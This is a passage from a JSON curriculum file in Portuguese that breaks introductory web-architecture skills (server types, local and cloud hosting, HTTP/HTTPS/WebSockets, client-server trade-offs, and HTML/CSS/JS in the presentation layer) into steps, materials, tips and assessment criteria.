                                "Liste corretamente Apache, Nginx como web servers.",
                                "Identifique Node.js e Tomcat como app servers.",
                                "Classifique MySQL como DB server.",
                                "Descreva o fluxo cliente -> web -> app -> DB.",
                                "Dê um exemplo real de stack (ex: MEAN).",
                                "Explique por que Nginx é preferido para alto tráfego."
                              ],
                              "assessmentCriteria": [
                                "Precisão na classificação dos tipos de servidores (100%).",
                                "Compreensão do papel no ecossistema (fluxo lógico).",
                                "Uso correto de exemplos específicos (Apache vs Nginx).",
                                "Capacidade de diagramar integração.",
                                "Identificação de cenários de uso práticos.",
                                "Ausência de confusões entre tipos de servidores."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores (protocolos HTTP/TCP).",
                                "Desenvolvimento Web (full-stack).",
                                "Banco de Dados (SQL/NoSQL).",
                                "Administração de Sistemas (DevOps, deployment).",
                                "Segurança da Informação (HTTPS, firewalls)."
                              ],
                              "realWorldApplication": "Ao desenvolver uma aplicação web escalável, escolher Nginx para front-end de alto tráfego, Node.js para lógica real-time e MySQL para dados transacionais garante performance e confiabilidade em produção."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "26.1.1.1.2.3",
                            "name": "Compreender hospedagem de servidores",
                            "description": "Entender conceitos básicos de hospedagem em nuvem (AWS, Azure) ou servidores locais para suportar múltiplos clientes simultaneamente.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender conceitos fundamentais de hospedagem de servidores",
                                  "subSteps": [
                                    "Definir o que é um servidor e sua função no modelo cliente-servidor",
                                    "Diferenciar hospedagem local (on-premise) de hospedagem em nuvem",
                                    "Identificar vantagens e desvantagens de cada tipo de hospedagem",
                                    "Explicar o papel do servidor em suportar múltiplos clientes",
                                    "Listar componentes básicos de um servidor (hardware, SO, software)"
                                  ],
                                  "verification": "Criar um diagrama comparativo entre hospedagem local e nuvem, explicando suporte a múltiplos clientes",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação oficial AWS Free Tier",
                                    "Documentação Microsoft Azure Free Account",
                                    "Vídeo introdutório sobre modelo cliente-servidor no YouTube"
                                  ],
                                  "tips": "Use analogias como 'casa própria vs aluguel de apartamento' para fixar diferenças",
                                  "learningObjective": "Compreender os princípios básicos que diferenciam tipos de hospedagem e seu impacto no suporte a clientes",
                                  "commonMistakes": "Confundir servidor com cliente; ignorar custos ocultos em hospedagem local"
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar hospedagem em servidores locais",
                                  "subSteps": [
                                    "Instalar um servidor local simples usando XAMPP ou WAMP",
                                    "Configurar portas e firewall para acesso externo básico",
                                    "Testar hospedagem de uma aplicação web simples com múltiplos acessos simultâneos",
                                    "Monitorar recursos (CPU, RAM) durante acessos múltiplos",
                                    "Analisar limitações de escalabilidade em ambiente local"
                                  ],
                                  "verification": "Hospedar um site HTML simples e acessar de dois dispositivos diferentes simultaneamente",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "XAMPP (gratuito)",
                                    "Computador com Windows/Linux",
                                    "Browser para testes"
                                  ],
                                  "tips": "Inicie com configurações padrão para evitar erros de porta bloqueada",
                                  "learningObjective": "Dominar configuração e teste prático de servidor local para múltiplos clientes",
                                  "commonMistakes": "Esquecer de abrir portas no firewall; superestimar capacidade de hardware doméstico"
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Introduzir hospedagem em nuvem com AWS e Azure",
                                  "subSteps": [
                                    "Criar conta gratuita no AWS EC2 e Azure Virtual Machines",
                                    "Lançar uma instância básica (t2.micro no AWS, B1s no Azure)",
                                    "Configurar segurança groups e endpoints para acesso público",
                                    "Deployar uma aplicação simples (ex: Node.js app) em ambas plataformas",
                                    "Comparar interfaces e custos iniciais entre AWS e Azure"
                                  ],
                                  "verification": "Executar uma aplicação web acessível via URL pública em AWS e Azure",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Conta AWS Free Tier",
                                    "Conta Azure Free Account",
                                    "Chave SSH para acesso remoto"
                                  ],
                                  "tips": "Use templates prontos (AMI no AWS) para agilizar o deploy inicial",
                                  "learningObjective": "Configurar e comparar instâncias em nuvem para hospedagem escalável",
                                  "commonMistakes": "Ignorar regras de segurança groups levando a bloqueios; não deletar instâncias após testes (custos)"
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar suporte a múltiplos clientes simultâneos",
                                  "subSteps": [
                                    "Estudar conceitos de concorrência, threads e load balancing",
                                    "Simular múltiplos acessos usando ferramentas como Apache Bench",
                                    "Configurar Auto Scaling básico no AWS ou Azure Scale Sets",
                                    "Medir performance (latência, throughput) em cenários de carga",
                                    "Documentar estratégias de escalabilidade horizontal vs vertical"
                                  ],
                                  "verification": "Gerar relatório com métricas de performance sob 10+ acessos simultâneos",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Apache Bench (ab tool)",
                                    "Documentação AWS Auto Scaling",
                                    "Azure Monitor"
                                  ],
                                  "tips": "Comece com cargas leves para evitar timeouts em contas free",
                                  "learningObjective": "Avaliar e otimizar servidores para lidar com concorrência de clientes",
                                  "commonMistakes": "Confundir escalabilidade vertical com horizontal; não monitorar métricas em tempo real"
                                }
                              ],
                              "practicalExample": "Configure um servidor Node.js no AWS EC2 que sirva uma API de chat simples, acessível por 5 navegadores simultâneos, comparando performance com uma versão local no XAMPP.",
                              "finalVerifications": [
                                "Explicar diferenças entre hospedagem local e nuvem com exemplos de custos",
                                "Demonstrar deploy de app em AWS e Azure com URLs funcionais",
                                "Simular 10 acessos simultâneos e registrar métricas de performance",
                                "Listar 3 vantagens de cada plataforma para cenários específicos",
                                "Criar diagrama de arquitetura cliente-servidor com escalabilidade"
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção entre tipos de hospedagem (80% acerto em quiz)",
                                "Sucesso no deploy prático em pelo menos uma plataforma nuvem",
                                "Análise correta de métricas de performance sob carga",
                                "Identificação de pelo menos 2 erros comuns e soluções",
                                "Clareza na explicação de escalabilidade para múltiplos clientes",
                                "Uso adequado de terminologia técnica (ex: EC2, VM, load balancing)"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Configuração de portas e protocolos (HTTP/HTTPS)",
                                "Segurança da Informação: Groups de segurança e firewalls",
                                "Desenvolvimento Web: Deploy de aplicações cliente-servidor",
                                "Administração de Sistemas: Monitoramento de recursos e logs"
                              ],
                              "realWorldApplication": "Hospedar sites e-commerce como Magazine Luiza em AWS para suportar milhares de usuários simultâneos, ou aplicativos internos em servidores locais para empresas com dados sensíveis."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "26.1.1.1.3",
                        "name": "Comunicação no Modelo Cliente-Servidor",
                        "description": "A interação entre cliente e servidor ocorre via protocolos como HTTP/HTTPS, onde o cliente envia requisições e o servidor responde, formando o ciclo fundamental da arquitetura.",
                        "specificSkills": [
                          {
                            "id": "26.1.1.1.3.1",
                            "name": "Explicar o fluxo de requisição-resposta",
                            "description": "Descrever o ciclo: cliente envia GET/POST → servidor processa → retorna status code (200 OK, 404 Not Found) e conteúdo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Requisição do Cliente",
                                  "subSteps": [
                                    "Identifique os componentes principais de uma requisição HTTP: método (GET/POST), URL, headers e body (se aplicável).",
                                    "Explique como o cliente (ex: browser) inicia a comunicação enviando a requisição para o endereço IP/porta do servidor.",
                                    "Descreva o papel do protocolo HTTP/HTTPS no encapsulamento da requisição.",
                                    "Diferencie requisições GET (leitura de dados) de POST (envio de dados).",
                                    "Simule uma requisição simples usando ferramentas como curl ou Postman."
                                  ],
                                  "verification": "Crie um diagrama simples da requisição e explique verbalmente para um par.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Documentação HTTP (MDN Web Docs), ferramenta curl ou Postman, papel e caneta para diagrama.",
                                  "tips": "Sempre pense no cliente como o 'perguntador' que formula a pergunta exata.",
                                  "learningObjective": "Entender os elementos que compõem uma requisição HTTP e como ela é enviada.",
                                  "commonMistakes": "Confundir método GET com POST; ignorar headers como User-Agent."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Processamento no Servidor",
                                  "subSteps": [
                                    "Descreva como o servidor recebe a requisição via socket TCP e a roteia para o handler apropriado.",
                                    "Explique o parsing da requisição: extração de método, URL, headers e body.",
                                    "Discuta o processamento lógico: autenticação, autorização, consulta a banco de dados ou lógica de negócio.",
                                    "Identifique possíveis erros durante o processamento (ex: recurso não encontrado).",
                                    "Simule o fluxo interno com pseudocódigo ou um servidor simples em Node.js/Express."
                                  ],
                                  "verification": "Escreva um pseudocódigo do processamento e teste com uma requisição real em um servidor local.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Servidor local (Node.js com Express), editor de código (VS Code), logs do servidor.",
                                  "tips": "Monitore os logs do servidor para visualizar o recebimento e processamento em tempo real.",
                                  "learningObjective": "Mapear as etapas internas de processamento de uma requisição no servidor.",
                                  "commonMistakes": "Achar que o servidor responde instantaneamente; ignorar latência de rede ou DB."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir e Enviar a Resposta do Servidor",
                                  "subSteps": [
                                    "Defina os componentes da resposta: status code (200, 404), headers (Content-Type) e body.",
                                    "Explique status codes principais: 2xx (sucesso), 4xx (erro cliente), 5xx (erro servidor).",
                                    "Descreva como o servidor serializa o conteúdo (JSON, HTML) e o envia de volta.",
                                    "Discuta compressão (Gzip) e caching via headers.",
                                    "Gere respostas manuais usando ferramentas como netcat ou um servidor de teste."
                                  ],
                                  "verification": "Envie uma requisição e capture a resposta completa com dev tools do browser.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Browser com DevTools (F12 > Network tab), servidor de teste.",
                                  "tips": "Sempre verifique o status code primeiro na resposta capturada.",
                                  "learningObjective": "Dominar a estrutura e os códigos de status de uma resposta HTTP.",
                                  "commonMistakes": "Confundir 404 (não encontrado) com 500 (erro interno); omitir Content-Type."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar o Ciclo Completo e Ciclo de Vida",
                                  "subSteps": [
                                    "Monte o diagrama completo: cliente → servidor → resposta → cliente.",
                                    "Explique o ciclo stateless do HTTP e o uso de cookies/sessões para estado.",
                                    "Discuta timeouts, reconexões e HTTPS para segurança.",
                                    "Compare com fluxos assíncronos (AJAX/Fetch).",
                                    "Debata o fluxo com um cenário de erro (ex: 404)."
                                  ],
                                  "verification": "Crie um fluxograma interativo ou vídeo curto explicando o ciclo inteiro.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Ferramenta de diagrama (Draw.io), gravador de tela.",
                                  "tips": "Use setas bidirecionais no diagrama para mostrar request/response.",
                                  "learningObjective": "Sintetizar o fluxo completo de requisição-resposta em um ciclo coeso.",
                                  "commonMistakes": "Ignorar que HTTP é stateless por padrão; confundir request com response."
                                }
                              ],
                              "practicalExample": "Abra o DevTools do browser (F12 > Network), digite 'google.com' na barra de endereço, envie GET /. Observe: request headers/body, servidor processa e retorna 200 OK com HTML. Simule erro acessando '/pagina-inexistente' (404 Not Found).",
                              "finalVerifications": [
                                "Pode diagramar o fluxo completo sem consultar notas?",
                                "Explica corretamente 3 status codes comuns com exemplos?",
                                "Simula uma requisição POST com body usando Postman?",
                                "Identifica headers chave em uma resposta real?",
                                "Diferencia processamento síncrono vs assíncrono?",
                                "Descreve impacto de erros no ciclo?"
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição dos componentes request/response (método, status, headers).",
                                "Clareza no diagrama do ciclo cliente-servidor.",
                                "Uso correto de exemplos práticos com ferramentas reais.",
                                "Cobertura de erros comuns (4xx/5xx) e handling.",
                                "Conexão com conceitos reais como HTTPS e stateless.",
                                "Profundidade nos substeps com pelo menos 4 detalhes por step."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Camadas TCP/IP e sockets.",
                                "Programação: Implementação em linguagens como JavaScript (Fetch) ou Python (Flask).",
                                "Banco de Dados: Consultas durante processamento de requisição.",
                                "Segurança da Informação: HTTPS, autenticação via headers."
                              ],
                              "realWorldApplication": "Todo acesso a sites (ex: login no Instagram: POST /login com credenciais → servidor valida → 200 com token ou 401 Unauthorized), APIs REST (ex: app de delivery consulta GET /pedidos), microsserviços em nuvem (AWS Lambda processa requests)."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "26.1.1.1.3.2",
                            "name": "Identificar protocolos principais",
                            "description": "Reconhecer HTTP, HTTPS, WebSockets como protocolos usados na comunicação cliente-servidor para web e aplicações internet.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o conceito de protocolos em comunicação cliente-servidor",
                                  "subSteps": [
                                    "Defina o que é um protocolo de rede e sua importância na comunicação cliente-servidor.",
                                    "Explique o papel do cliente (ex: navegador) e servidor (ex: web server) na troca de dados.",
                                    "Identifique exemplos genéricos de protocolos de rede (TCP/IP como base).",
                                    "Diferencie protocolos de aplicação (camada superior) de protocolos de transporte.",
                                    "Pesquise diagramas do modelo cliente-servidor com protocolos."
                                  ],
                                  "verification": "Crie um diagrama simples no papel ou ferramenta online mostrando cliente-servidor com protocolos genéricos e explique oralmente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Papel e caneta ou ferramenta como Draw.io, acesso à internet para diagramas básicos.",
                                  "tips": "Use analogias como 'protocolo é como regras de um jogo' para fixar o conceito.",
                                  "learningObjective": "Compreender o papel fundamental dos protocolos na padronização da comunicação cliente-servidor.",
                                  "commonMistakes": "Confundir protocolos de aplicação com protocolos de transporte (ex: achar que HTTP é camada de transporte)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Reconhecer e descrever o protocolo HTTP",
                                  "subSteps": [
                                    "Estude a definição de HTTP (HyperText Transfer Protocol) e suas versões principais (1.1, 2, 3).",
                                    "Identifique métodos comuns: GET, POST, PUT, DELETE.",
                                    "Analise o fluxo: requisição cliente -> resposta servidor (status codes como 200, 404).",
                                    "Abra o DevTools do navegador e observe uma requisição HTTP em um site simples.",
                                    "Anote diferenças entre requisição e resposta HTTP."
                                  ],
                                  "verification": "Capture uma requisição HTTP no DevTools e liste método, URL e status code corretamente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Navegador web (Chrome/Firefox) com DevTools ativado, site de teste como httpbin.org.",
                                  "tips": "Sempre limpe o cache do navegador para ver requisições frescas.",
                                  "learningObjective": "Identificar HTTP como protocolo stateless para transferência de hipertexto na web.",
                                  "commonMistakes": "Confundir HTTP com HTML (HTTP transporta dados, HTML é o conteúdo)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Diferenciar HTTPS de HTTP e entender segurança",
                                  "subSteps": [
                                    "Explique HTTPS como HTTP Secure (HTTP + TLS/SSL).",
                                    "Descreva o handshake SSL/TLS: certificados, chaves públicas/privadas.",
                                    "Verifique um site HTTPS no navegador: ícone de cadeado e certificado.",
                                    "Compare HTTP vs HTTPS em DevTools (porta 80 vs 443).",
                                    "Discuta riscos de HTTP (dados em claro) vs benefícios de HTTPS (criptografia)."
                                  ],
                                  "verification": "Acesse um site HTTP e HTTPS, capture tráfego e explique diferenças de segurança observadas.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Navegador com DevTools, sites de teste: http://example.com e https://example.com.",
                                  "tips": "Use whatsmycertificate.org para inspecionar certificados facilmente.",
                                  "learningObjective": "Reconhecer HTTPS como versão segura do HTTP para comunicações protegidas.",
                                  "commonMistakes": "Achar que HTTPS só muda a porta, ignorando a criptografia."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar WebSockets para comunicação bidirecional",
                                  "subSteps": [
                                    "Defina WebSockets como protocolo full-duplex sobre TCP para tempo real.",
                                    "Compare com HTTP: persistente vs request-response.",
                                    "Estude handshake WebSocket (Upgrade header em HTTP).",
                                    "Teste um demo WebSocket no navegador (console ou site como websocket.org).",
                                    "Identifique usos: chats, games online, notificações live."
                                  ],
                                  "verification": "Conecte a um WebSocket echo server e envie/receba mensagens via JavaScript no console.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Navegador com console JS, site websocket.org/echo.html.",
                                  "tips": "Cole o código JS pronto do demo para testar rapidamente.",
                                  "learningObjective": "Identificar WebSockets como protocolo para comunicação em tempo real cliente-servidor.",
                                  "commonMistakes": "Confundir WebSockets com polling HTTP (WebSockets é push/pull eficiente)."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Comparar e identificar protocolos em cenários reais",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: HTTP, HTTPS, WebSockets (porta, uso, características).",
                                    "Analise tráfego de sites reais: YouTube (HTTP/HTTPS), chat (WebSockets).",
                                    "Classifique protocolos em cenários: navegação web, login seguro, app de mensagens.",
                                    "Resolva quiz simples identificando protocolo por descrição.",
                                    "Discuta quando usar cada um."
                                  ],
                                  "verification": "Preencha tabela comparativa e classifique 5 cenários corretamente.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Planilha Google Sheets ou papel para tabela, DevTools.",
                                  "tips": "Portas ajudam na identificação: 80/HTTP, 443/HTTPS, 80/443 para WebSockets.",
                                  "learningObjective": "Diferenciar e identificar HTTP, HTTPS e WebSockets em contextos cliente-servidor.",
                                  "commonMistakes": "Ignorar que WebSockets inicia com HTTP mas persiste."
                                }
                              ],
                              "practicalExample": "Ao acessar um site de e-commerce como Amazon.com, use DevTools para ver requisições HTTPS (método GET/POST), o ícone de cadeado confirmando segurança, e em chats de suporte ao vivo, inspecione WebSockets para mensagens em tempo real trocadas bidirecionalmente.",
                              "finalVerifications": [
                                "Lista corretamente HTTP, HTTPS e WebSockets com uma característica única cada.",
                                "Explica diferença entre HTTP request-response e WebSocket full-duplex.",
                                "Identifica porta padrão e uso principal de cada protocolo.",
                                "Demonstra captura de tráfego no DevTools para os três protocolos.",
                                "Classifica cenários reais (ex: login = HTTPS, chat = WebSockets).",
                                "Discute por que HTTPS é essencial para dados sensíveis."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e características de cada protocolo (80% correto).",
                                "Capacidade de demonstrar via DevTools (capturas claras e explicadas).",
                                "Compreensão de comparações (tabela ou explicação verbal fluida).",
                                "Identificação correta em 90% dos cenários práticos.",
                                "Uso correto de terminologia (stateless, full-duplex, TLS).",
                                "Explicação de segurança e aplicações reais."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Camadas OSI/TCP-IP onde protocolos atuam.",
                                "Segurança da Informação: Criptografia TLS em HTTPS.",
                                "Desenvolvimento Web: Uso em HTML/JS para fetch() HTTP e WebSocket API.",
                                "Matemática/Algoritmos: Handshake como troca de chaves assimétricas."
                              ],
                              "realWorldApplication": "Em desenvolvimento de apps web, desenvolvedores usam HTTP/HTTPS para carregar páginas e APIs REST, HTTPS para e-commerces/proteção de dados (GDPR), e WebSockets em apps como WhatsApp Web ou jogos multiplayer para atualizações em tempo real sem recarregar a página."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "26.1.1.1.3.3",
                            "name": "Analisar vantagens do modelo",
                            "description": "Discutir benefícios como centralização de dados no servidor, escalabilidade e facilidade de manutenção, contrastando com desvantagens como ponto único de falha.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os componentes fundamentais do modelo Cliente-Servidor",
                                  "subSteps": [
                                    "Defina o papel do cliente (ex: navegador web solicitando dados).",
                                    "Defina o papel do servidor (ex: máquina hospedando dados e lógica de negócio).",
                                    "Desenhe um diagrama simples mostrando a comunicação entre cliente e servidor via rede.",
                                    "Identifique protocolos comuns como HTTP/HTTPS usados na comunicação.",
                                    "Explique o fluxo básico de uma requisição-resposta."
                                  ],
                                  "verification": "Desenhe e explique um diagrama do modelo Cliente-Servidor corretamente para um colega.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Papel e caneta ou ferramenta de diagrama como Draw.io",
                                    "Artigo introdutório sobre modelo Cliente-Servidor"
                                  ],
                                  "tips": "Use analogias cotidianas, como cliente = garçom pedindo comida, servidor = cozinha.",
                                  "learningObjective": "Entender a estrutura básica para contextualizar vantagens e desvantagens.",
                                  "commonMistakes": "Confundir cliente com servidor ou ignorar a camada de rede."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e detalhar as principais vantagens do modelo",
                                  "subSteps": [
                                    "Liste e descreva centralização de dados no servidor (segurança e consistência).",
                                    "Explique escalabilidade (adicionar servidores facilmente).",
                                    "Discuta facilidade de manutenção (atualizações centralizadas).",
                                    "Aborde gerenciamento de recursos (servidor lida com processamento pesado).",
                                    "Forneça exemplos reais para cada vantagem."
                                  ],
                                  "verification": "Crie uma tabela com pelo menos 4 vantagens e suas descrições detalhadas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Planilha ou documento para tabela",
                                    "Vídeos tutoriais sobre arquitetura web"
                                  ],
                                  "tips": "Priorize vantagens quantificáveis, como redução de custos em manutenção.",
                                  "learningObjective": "Dominar os benefícios chave para análise posterior.",
                                  "commonMistakes": "Listar vantagens genéricas sem exemplos ou ligação ao modelo específico."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e detalhar as principais desvantagens do modelo",
                                  "subSteps": [
                                    "Descreva o ponto único de falha (servidor cai, tudo para).",
                                    "Explique latência de rede (dependência de conexão).",
                                    "Discuta sobrecarga no servidor em alta demanda.",
                                    "Aborde questões de segurança (ataques concentrados no servidor).",
                                    "Compare brevemente com modelo peer-to-peer."
                                  ],
                                  "verification": "Elabore uma lista de 4 desvantagens com impactos potenciais.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentos sobre falhas em sistemas cliente-servidor",
                                    "Casos de estudo como outages do AWS"
                                  ],
                                  "tips": "Pense em cenários reais de falha para tornar concreto.",
                                  "learningObjective": "Reconhecer limitações para um contraste equilibrado.",
                                  "commonMistakes": "Exagerar desvantagens sem contexto ou ignorar mitigações."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Contrastar vantagens e desvantagens em uma análise comparativa",
                                  "subSteps": [
                                    "Crie uma matriz comparativa (vantagens vs desvantagens).",
                                    "Avalie quando vantagens superam desvantagens (ex: apps corporativas).",
                                    "Proponha soluções para mitigar desvantagens (ex: load balancers).",
                                    "Conclua com cenários ideais para o modelo Cliente-Servidor.",
                                    "Discuta evolução para microsserviços."
                                  ],
                                  "verification": "Apresente a análise em um relatório curto ou slide.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramenta de apresentação como Google Slides",
                                    "Referências bibliográficas sobre arquiteturas"
                                  ],
                                  "tips": "Use pesos qualitativos (alto/baixo impacto) na matriz.",
                                  "learningObjective": "Desenvolver habilidade analítica de prós e contras.",
                                  "commonMistakes": "Fazer contraste superficial sem evidências ou equilíbrio."
                                }
                              ],
                              "practicalExample": "Analise o site de um banco online: cliente (app móvel) envia requisição de saldo ao servidor centralizado (vantagem: dados seguros e atualizados); se servidor cai, app não funciona (desvantagem: ponto único de falha). Compare com app P2P como Bitcoin.",
                              "finalVerifications": [
                                "Pode listar e explicar 4 vantagens principais com exemplos?",
                                "Identifica pelo menos 3 desvantagens e mitigações?",
                                "Cria uma matriz comparativa coerente?",
                                "Explica cenários onde o modelo é ideal?",
                                "Discute impacto na escalabilidade real?",
                                "Contrasta corretamente com alternativas?"
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude das vantagens/desvantagens (30%)",
                                "Profundidade da análise comparativa (25%)",
                                "Uso de exemplos concretos e evidências (20%)",
                                "Clareza e estrutura da apresentação (15%)",
                                "Criatividade em mitigações e conexões reais (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos de comunicação (HTTP, TCP/IP)",
                                "Segurança da Informação: Vulnerabilidades centralizadas e autenticação",
                                "Desenvolvimento de Software: Impacto na programação full-stack",
                                "Gestão de Projetos: Considerações de escalabilidade em planejamento"
                              ],
                              "realWorldApplication": "Em empresas como Netflix ou Google, o modelo Cliente-Servidor permite centralizar conteúdo e dados para milhões de usuários, com escalabilidade via clusters de servidores, mas requer redundância para evitar outages globais como o de 2021 no Fastly CDN."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.2",
                    "name": "Arquitetura em Camadas",
                    "description": "Estrutura básica dividida em camadas de apresentação, lógica de negócios e persistência de dados.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.2.1",
                        "name": "Camada de Apresentação",
                        "description": "A camada de apresentação é responsável pela interface do usuário, gerenciando a exibição de dados e a interação direta com o usuário final, utilizando tecnologias como HTML, CSS e JavaScript para criar uma experiência visual e responsiva.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.2.1.1",
                            "name": "Identificar os componentes principais da camada de apresentação",
                            "description": "Reconhecer e listar os elementos essenciais como HTML para estrutura, CSS para estilo e JavaScript para interatividade, explicando como eles se integram para formar a interface do usuário em aplicações web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o conceito de Camada de Apresentação",
                                  "subSteps": [
                                    "Pesquise a definição de arquitetura em camadas em aplicações web.",
                                    "Identifique o papel da camada de apresentação na separação de responsabilidades.",
                                    "Compare com camadas de lógica de negócio e dados.",
                                    "Anote exemplos de interfaces web que utilizam essa camada.",
                                    "Desenhe um diagrama simples da arquitetura em camadas."
                                  ],
                                  "verification": "Crie um resumo de 1 parágrafo explicando o papel da camada de apresentação e verifique se menciona separação de responsabilidades.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso à internet para pesquisa",
                                    "Bloco de notas ou editor de texto"
                                  ],
                                  "tips": "Use analogias como 'frente da loja' para visualizar a camada de apresentação.",
                                  "learningObjective": "Compreender o propósito e posição da camada de apresentação na arquitetura web.",
                                  "commonMistakes": [
                                    "Confundir com backend",
                                    "Ignorar a separação de camadas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o HTML como estrutura",
                                  "subSteps": [
                                    "Abra um editor de código e crie um arquivo HTML básico com tags <html>, <head> e <body>.",
                                    "Adicione elementos como <h1>, <p>, <div> e <img>.",
                                    "Valide o código usando o validador W3C.",
                                    "Observe como o navegador renderiza a estrutura sem estilo.",
                                    "Liste 5 tags semânticas (ex: <header>, <nav>)."
                                  ],
                                  "verification": "Abra o HTML no navegador e confirme que a estrutura é exibida corretamente sem erros de console.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Editor de código (VS Code)",
                                    "Navegador web",
                                    "Validador W3C online"
                                  ],
                                  "tips": "Sempre use tags semânticas para melhor acessibilidade.",
                                  "learningObjective": "Reconhecer HTML como responsável pela estrutura semântica da página.",
                                  "commonMistakes": [
                                    "Usar tags apenas visuais semântica",
                                    "Esquecer de fechar tags"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar o CSS para estilização",
                                  "subSteps": [
                                    "Crie um arquivo CSS e linke ao HTML anterior.",
                                    "Aplique estilos básicos: cores, fontes, margens e flexbox para layout.",
                                    "Use seletores (classe, ID, elemento) para targeting.",
                                    "Teste responsividade com media queries.",
                                    "Inspecione elementos no DevTools do navegador."
                                  ],
                                  "verification": "Modifique o visual da página alterando apenas CSS e confirme mudanças no navegador.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de código",
                                    "Navegador com DevTools",
                                    "Documentação MDN CSS"
                                  ],
                                  "tips": "Comece com reset CSS para evitar estilos padrão do navegador.",
                                  "learningObjective": "Identificar CSS como ferramenta para visual e layout da interface.",
                                  "commonMistakes": [
                                    "Escrever CSS inline em produção",
                                    "Ignorar especificidade de seletores"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar JavaScript para interatividade",
                                  "subSteps": [
                                    "Adicione um script JS ao HTML.",
                                    "Implemente eventos simples: clique em botão para alterar texto.",
                                    "Manipule o DOM: adicione/remova elementos dinamicamente.",
                                    "Use console.log para debug.",
                                    "Teste validação de formulário básica."
                                  ],
                                  "verification": "Execute ações interativas (ex: botão muda cor) e verifique no console sem erros.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de código",
                                    "Navegador com console DevTools",
                                    "Documentação MDN JS"
                                  ],
                                  "tips": "Escreva JS modular em funções para reutilização.",
                                  "learningObjective": "Compreender JS como responsável pela dinâmica e interatividade da UI.",
                                  "commonMistakes": [
                                    "Não aguardar DOM load",
                                    "Ignorar erros de sintaxe"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar HTML, CSS e JS na camada de apresentação",
                                  "subSteps": [
                                    "Combine os arquivos em um projeto único: HTML estrutura, CSS estiliza, JS interage.",
                                    "Crie uma mini-página com botão que muda layout via JS.",
                                    "Otimize carregamento: link CSS no head, JS no final body.",
                                    "Teste em diferentes navegadores.",
                                    "Documente a integração em um README."
                                  ],
                                  "verification": "A página funciona integralmente: estrutura, estilo e interatividade sem conflitos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Projeto dos steps anteriores",
                                    "Navegadores múltiplos"
                                  ],
                                  "tips": "Use frameworks como Bootstrap para inspiração, mas foque no vanilla.",
                                  "learningObjective": "Explicar como os três componentes se integram para formar a UI completa.",
                                  "commonMistakes": [
                                    "Carregar JS antes do DOM",
                                    "Conflitos de CSS global"
                                  ]
                                }
                              ],
